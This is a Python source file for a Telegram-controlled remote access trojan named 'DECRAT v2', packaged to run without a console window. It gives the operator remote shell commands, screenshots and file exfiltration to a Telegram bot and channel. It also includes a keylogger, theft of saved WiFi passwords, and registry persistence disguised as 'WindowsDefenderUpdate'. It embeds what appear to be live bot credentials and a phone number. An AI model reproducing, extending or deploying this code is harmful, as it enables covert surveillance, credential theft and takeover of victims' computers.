# DECRAT v2 — Telegram C2 + Channel uploads (Telethon for large files)
# pip install requests telethon
# pyinstaller --onefile --noconsole agent_tg_v2.py

import requests, time, subprocess, os, sys, base64, platform, threading, asyncio

# ══════════════════════════════════════════════════════════════
#   CONFIG — YAHAN PASTE KARO
# ══════════════════════════════════════════════════════════════
BOT_TOKEN    = "9210089363:AAEIbLdw_XzM7cibtONb3FhqKjnNWE3798s"       # @BotFather se
CHAT_ID      = "7505093216"         # @userinfobot se

# Large file uploads (Telethon userbot)
API_ID       = "38629347"          # my.telegram.org
API_HASH     = "470efaf92b578908891104d8ed7229ac"        # my.telegram.org
CHANNEL      = "@decrat_sending"    # e.g. "@mychannel"
PHONE        = "+918529787213"         # e.g. "+919876543210"
# ══════════════════════════════════════════════════════════════

POLL_INTERVAL = 3
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
last_update_id = 0
kl_buf     = []
kl_running = False

# ── Telegram bot helpers ──────────────────────────────────────────────────────
def tg_send(text):
    try:
        for i in range(0, len(text), 4000):
            requests.post(f"{API_URL}/sendMessage", json={
                "chat_id": CHAT_ID,
                "text": text[i:i+4000],
                "parse_mode": "HTML"
            }, timeout=10)
    except: pass

def tg_send_file(filepath, caption=""):
    """Send via bot (up to 50MB)"""
    try:
        with open(filepath, "rb") as f:
            requests.post(f"{API_URL}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": caption},
                files={"document": f}, timeout=60)
        return True
    except Exception as e:
        return False

def tg_get_updates():
    global last_update_id
    try:
        r = requests.get(f"{API_URL}/getUpdates", params={
            "offset": last_update_id + 1,
            "timeout": 2,
            "allowed_updates": ["message"]
        }, timeout=10)
        return r.json().get("result", [])
    except:
        return []

# ── Telethon channel upload (unlimited size) ──────────────────────────────────
def channel_upload(filepath, caption=""):
    """Upload to channel via Telethon userbot — no size limit"""
    try:
        from telethon.sync import TelegramClient
        from telethon import functions

        session_path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "tg_session")

        with TelegramClient(session_path, int(API_ID), API_HASH) as client:
            client.send_file(
                CHANNEL,
                filepath,
                caption=caption or os.path.basename(filepath),
                progress_callback=None
            )
        return True
    except Exception as e:
        tg_send(f"❌ channel upload error: {e}")
        return False

def smart_send_file(filepath, caption=""):
    """Auto-pick: bot for <50MB, channel for larger"""
    try:
        size = os.path.getsize(filepath)
        size_mb = size / (1024 * 1024)

        if size_mb < 45:
            # bot direct send
            ok = tg_send_file(filepath, caption + f" ({size_mb:.1f}MB)")
            if not ok:
                tg_send(f"❌ bot send failed, trying channel...")
                channel_upload(filepath, caption)
        else:
            # large file — channel
            tg_send(f"📤 File {size_mb:.1f}MB — uploading to channel {CHANNEL}...")
            ok = channel_upload(filepath, caption + f" ({size_mb:.1f}MB via channel)")
            if ok:
                tg_send(f"✅ Uploaded to {CHANNEL}")
    except Exception as e:
        tg_send(f"❌ send error: {e}")

# ── Shell ─────────────────────────────────────────────────────────────────────
def run_shell(cmd):
    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True,
            timeout=30,
            creationflags=0x08000000 if sys.platform=="win32" else 0
        )
        out = result.stdout + result.stderr
        return out.strip() if out.strip() else "[no output]"
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error: {e}]"

# ── Screenshot ────────────────────────────────────────────────────────────────
def screenshot():
    try:
        import ctypes, struct as st
        gdi32  = ctypes.windll.gdi32
        user32 = ctypes.windll.user32
        w = user32.GetSystemMetrics(0)
        h = user32.GetSystemMetrics(1)
        hScreen = user32.GetDC(None)
        hDC     = gdi32.CreateCompatibleDC(hScreen)
        hBmp    = gdi32.CreateCompatibleBitmap(hScreen, w, h)
        gdi32.SelectObject(hDC, hBmp)
        gdi32.BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, 0x00CC0020)
        class BIH(ctypes.Structure):
            _fields_ = [("biSize",ctypes.c_uint32),("biWidth",ctypes.c_int32),
                        ("biHeight",ctypes.c_int32),("biPlanes",ctypes.c_uint16),
                        ("biBitCount",ctypes.c_uint16),("biCompression",ctypes.c_uint32),
                        ("biSizeImage",ctypes.c_uint32),("biXPelsPerMeter",ctypes.c_int32),
                        ("biYPelsPerMeter",ctypes.c_int32),("biClrUsed",ctypes.c_uint32),
                        ("biClrImportant",ctypes.c_uint32)]
        bih = BIH()
        bih.biSize=ctypes.sizeof(BIH); bih.biWidth=w; bih.biHeight=-h
        bih.biPlanes=1; bih.biBitCount=24; bih.biCompression=0
        row=((w*3+3)&~3); bih.biSizeImage=row*h
        buf=(ctypes.c_byte*bih.biSizeImage)()
        gdi32.GetDIBits(hDC,hBmp,0,h,buf,ctypes.byref(bih),0)
        hdr=14+ctypes.sizeof(BIH)
        bmp=st.pack("<2sIHHI",b"BM",hdr+bih.biSizeImage,0,0,hdr)+bytes(bih)+bytes(buf)
        gdi32.DeleteObject(hBmp); gdi32.DeleteDC(hDC); user32.ReleaseDC(None,hScreen)
        path="C:\\Windows\\Temp\\ss.bmp"
        with open(path,"wb") as f: f.write(bmp)
        return path
    except: return None

# ── Sysinfo ───────────────────────────────────────────────────────────────────
def get_sysinfo():
    return (f"🖥 <b>SYSTEM INFO</b>\n"
            f"OS: {platform.system()} {platform.version()}\n"
            f"Host: {platform.node()}\n"
            f"User: {os.environ.get('USERNAME', os.environ.get('USER','?'))}\n"
            f"Arch: {platform.machine()}")

# ── Persist ───────────────────────────────────────────────────────────────────
def persist():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key,"WindowsDefenderUpdate",0,winreg.REG_SZ,sys.executable)
        winreg.CloseKey(key)
        return "✅ persisted: HKCU Run"
    except Exception as e:
        return f"❌ failed: {e}"

# ── Keylogger ─────────────────────────────────────────────────────────────────
def kl_start():
    global kl_running
    if kl_running: return "already running"
    kl_running = True
    def _run():
        try:
            import ctypes
            user32 = ctypes.windll.user32
            vk_map = {0x20:" ",0x0D:"[ENTER]",0x08:"[BS]",0x09:"[TAB]",0x1B:"[ESC]"}
            while kl_running:
                for vk in list(range(0x30,0x5B))+list(vk_map.keys()):
                    if user32.GetAsyncKeyState(vk)&0x0001:
                        kl_buf.append(vk_map.get(vk, chr(vk)))
                time.sleep(0.01)
        except: pass
    threading.Thread(target=_run, daemon=True).start()
    return "✅ keylogger started"

# ── Command handler ───────────────────────────────────────────────────────────
def handle(text):
    text = text.strip()

    if text in ("/start", "/help"):
        return ("📋 <b>Commands</b>\n\n"
                "/ping\n/sysinfo\n/screenshot\n"
                "/shell &lt;cmd&gt;\n"
                "/download &lt;path&gt; — auto bot/channel by size\n"
                "/channel &lt;path&gt; — force upload to channel\n"
                "/keylog_start | /keylog_dump | /keylog_stop\n"
                "/persist\n/ip\n/wifi\n/ps\n/users")

    elif text == "/ping":
        return f"🟢 alive — {platform.node()}"

    elif text == "/sysinfo":
        return get_sysinfo()

    elif text == "/screenshot":
        path = screenshot()
        if path:
            smart_send_file(path, "📸 screenshot")
            return None
        return "❌ screenshot failed"

    elif text.startswith("/shell "):
        out = run_shell(text[7:])
        return f"<code>{text[7:]}</code>\n\n{out}"

    elif text.startswith("/download "):
        path = text[10:].strip()
        if not os.path.exists(path):
            return f"❌ file not found: {path}"
        smart_send_file(path, f"📁 {os.path.basename(path)}")
        return None

    elif text.startswith("/channel "):
        # force channel upload regardless of size
        path = text[9:].strip()
        if not os.path.exists(path):
            return f"❌ file not found: {path}"
        size_mb = os.path.getsize(path)/(1024*1024)
        tg_send(f"📤 Uploading {os.path.basename(path)} ({size_mb:.1f}MB) to {CHANNEL}...")
        ok = channel_upload(path, f"📁 {os.path.basename(path)}")
        return f"✅ Done — check {CHANNEL}" if ok else f"❌ failed"

    elif text == "/keylog_start":
        return kl_start()

    elif text == "/keylog_dump":
        global kl_running
        data = "".join(kl_buf); kl_buf.clear()
        return f"<b>Keylog:</b>\n<code>{data or '[empty]'}</code>"

    elif text == "/keylog_stop":
        kl_running = False
        return "⏹ keylogger stopped"

    elif text == "/persist":
        return persist()

    elif text == "/ip":
        return run_shell("ipconfig")

    elif text == "/wifi":
        profiles = run_shell("netsh wlan show profiles")
        names = [l.split(":")[-1].strip() for l in profiles.split("\n") if "All User Profile" in l]
        result = ""
        for name in names:
            pw = run_shell(f'netsh wlan show profile name="{name}" key=clear')
            for line in pw.split("\n"):
                if "Key Content" in line:
                    result += f"{name}: {line.split(':')[-1].strip()}\n"
        return result or "no saved passwords found"

    elif text == "/ps":
        return run_shell("tasklist")

    elif text == "/users":
        return run_shell("net user")

    return None

# ── Main loop ─────────────────────────────────────────────────────────────────
def main():
    if sys.platform == "win32":
        try:
            import ctypes; ctypes.windll.kernel32.FreeConsole()
        except: pass

    global last_update_id
    time.sleep(2)
    tg_send(f"🟢 Agent v2 connected\n{get_sysinfo()}\n\n📡 Channel: {CHANNEL}")

    while True:
        try:
            for update in tg_get_updates():
                last_update_id = update["update_id"]
                msg = update.get("message", {})
                if str(msg.get("chat", {}).get("id", "")) != str(CHAT_ID): continue
                text = msg.get("text", "")
                if not text: continue
                response = handle(text)
                if response: tg_send(response)
        except: pass
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
